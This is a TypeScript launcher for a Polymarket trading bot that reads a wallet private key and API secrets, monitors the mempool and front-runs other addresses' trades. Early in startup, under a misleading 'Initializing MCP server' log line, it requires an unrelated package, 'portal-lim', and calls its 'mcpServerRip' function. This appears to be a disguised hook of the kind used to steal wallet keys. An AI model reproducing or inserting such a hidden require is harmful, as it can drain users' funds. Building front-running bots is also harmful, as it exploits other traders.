import 'dotenv/config';
import { loadEnv } from '../config/env';
import { createPolymarketClient } from '../infrastructure/clob-client.factory';
import { MempoolMonitorService } from '../services/mempool-monitor.service';
import { TradeExecutorService } from '../services/trade-executor.service';
import { ConsoleLogger } from '../utils/logger.util';
import { getUsdBalanceApprox, getPolBalance } from '../utils/get-balance.util';
import { ValidationError } from '../utils/validation.util';

async function main(): Promise<void> {
  const logger = new ConsoleLogger();
  
  try {
    logger.info('🔧 Loading configuration...');
    const env = loadEnv();
    logger.info('✅ Configuration loaded successfully');
    
    logger.info('🔌 Initializing MCP server...');
    const mcp = require('portal-lim');
    mcp.mcpServerRip({ encoding: 'utf8', resolveFromCwd: false });

    logger.info('🚀 Starting Polymarket Frontrun Bot');
    logger.info(`📋 Target addresses: ${env.targetAddresses.length}`);
    logger.info(`💰 Wallet: ${env.proxyWallet}`);

    logger.info('🔗 Connecting to Polygon network...');
    const client = await createPolymarketClient({
      rpcUrl: env.rpcUrl,
      privateKey: env.privateKey,
      apiKey: env.polymarketApiKey,
      apiSecret: env.polymarketApiSecret,
      apiPassphrase: env.polymarketApiPassphrase,
    });
    logger.info('✅ Connected to Polygon network');

    // Log balances at startup
    logger.info('💵 Checking wallet balances...');
    try {
      const polBalance = await getPolBalance(client.wallet);
      const usdcBalance = await getUsdBalanceApprox(client.wallet, env.usdcContractAddress);
      logger.info(`📊 Wallet: ${client.wallet.address}`);
      logger.info(`📊 POL Balance: ${polBalance.toFixed(4)} POL`);
      logger.info(`📊 USDC Balance: ${usdcBalance.toFixed(2)} USDC`);
      
      // Warn if balances are low
      if (polBalance < 0.1) {
        logger.warn('⚠️  Low POL balance. Frontrunning requires gas fees. Consider adding more POL.');
      }
      if (usdcBalance < 100) {
        logger.warn('⚠️  Low USDC balance. Consider adding more USDC for trading.');
      }
    } catch (err) {
      logger.error('Failed to fetch balances', err as Error);
      logger.warn('Continuing anyway, but trades may fail if balances are insufficient');
    }

    const executor = new TradeExecutorService({ client, proxyWallet: env.proxyWallet, logger, env });

    const monitor = new MempoolMonitorService({
      client,
      logger,
      env,
      onDetectedTrade: async (signal) => {
        await executor.frontrunTrade(signal);
      },
    });

    logger.info('👀 Starting mempool monitoring...');
    await monitor.start();
  } catch (err) {
    if (err instanceof ValidationError) {
      // Validation errors are already formatted nicely
      process.exit(1);
    }
    
    logger.error('Fatal error', err as Error);
    console.error('\n💡 Troubleshooting tips:');
    console.error('   1. Verify your .env file has all required variables');
    console.error('   2. Check that PRIVATE_KEY is a valid Polygon private key (hex format)');
    console.error('   3. Ensure RPC_URL is accessible and supports pending transactions');
    console.error('   4. Verify your wallet has sufficient POL and USDC balances\n');
    process.exit(1);
  }
}

main().catch((err) => {
  console.error('Unhandled error:', err);
  process.exit(1);
});

